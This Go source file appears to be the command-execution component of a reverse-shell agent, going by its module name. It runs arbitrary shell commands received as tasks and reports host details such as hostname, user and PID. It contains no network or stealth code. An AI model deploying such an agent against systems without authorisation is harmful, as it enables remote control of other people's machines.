package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os/exec"
	"runtime"
	"time"

	"reverseshell/internal/protocol"
)

var startedAt = time.Now()

// ExecuteTask decodes nothing by itself: it runs a validated task spec to
// completion and returns its result (README §4.5).
func ExecuteTask(ctx context.Context, spec protocol.TaskSpec, info protocol.AgentInfo) protocol.TaskResult {
	start := time.Now()
	var res protocol.TaskResult
	switch spec.Kind {
	case protocol.KindShell:
		res = runShell(ctx, spec)
	case protocol.KindSysinfo:
		res = sysinfo(info)
	default:
		res = protocol.TaskResult{
			Status: protocol.StatusUnsupported,
			Detail: fmt.Sprintf("kind %q not supported", spec.Kind),
		}
	}
	res.DurationMS = time.Since(start).Milliseconds()
	return res
}

func runShell(ctx context.Context, spec protocol.TaskSpec) protocol.TaskResult {
	var args protocol.ShellArgs
	if len(spec.Args) > 0 {
		if err := json.Unmarshal(spec.Args, &args); err != nil {
			return protocol.TaskResult{Status: protocol.StatusError, Detail: "bad shell args: " + err.Error()}
		}
	}
	if args.Cmd == "" {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: "shell task requires args.cmd"}
	}
	timeout := spec.Timeout
	if timeout <= 0 {
		timeout = 30
	}
	cctx, cancel := context.WithTimeout(ctx, time.Duration(timeout*float64(time.Second)))
	defer cancel()

	// Wrap the system shell: cmd /C on Windows, /bin/sh -c on Unix.
	cmd := exec.CommandContext(cctx, shell(), shellFlag(), args.Cmd)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()

	res := protocol.TaskResult{Stdout: stdout.String(), Stderr: stderr.String()}
	switch {
	case cctx.Err() == context.DeadlineExceeded:
		res.Status = protocol.StatusTimeout
		res.Detail = fmt.Sprintf("command exceeded %.0fs", timeout)
	case cctx.Err() != nil:
		res.Status = protocol.StatusError
		res.Detail = "task cancelled"
	case cmd.ProcessState == nil:
		// The command never started (launch failure).
		res.Status = protocol.StatusError
		res.Detail = fmt.Sprintf("launch: %v", err)
	default:
		// The command ran to completion; a non-zero exit code is data
		// about the command, not a protocol error.
		res.Status = protocol.StatusOK
		res.ExitCode = cmd.ProcessState.ExitCode()
	}
	return res
}

func shell() string {
	if runtime.GOOS == "windows" {
		return "cmd"
	}
	return "/bin/sh"
}

func shellFlag() string {
	if runtime.GOOS == "windows" {
		return "/C"
	}
	return "-c"
}

func sysinfo(info protocol.AgentInfo) protocol.TaskResult {
	snap := map[string]any{
		"hostname":       info.Hostname,
		"os":             info.OS,
		"os_version":     info.OSVersion,
		"arch":           info.Arch,
		"user":           info.User,
		"pid":            info.PID,
		"agent_version":  info.ClientVersion,
		"uptime_seconds": int(time.Since(startedAt).Seconds()),
	}
	b, err := json.Marshal(snap)
	if err != nil {
		return protocol.TaskResult{Status: protocol.StatusError, Detail: err.Error()}
	}
	return protocol.TaskResult{Status: protocol.StatusOK, Stdout: string(b)}
}
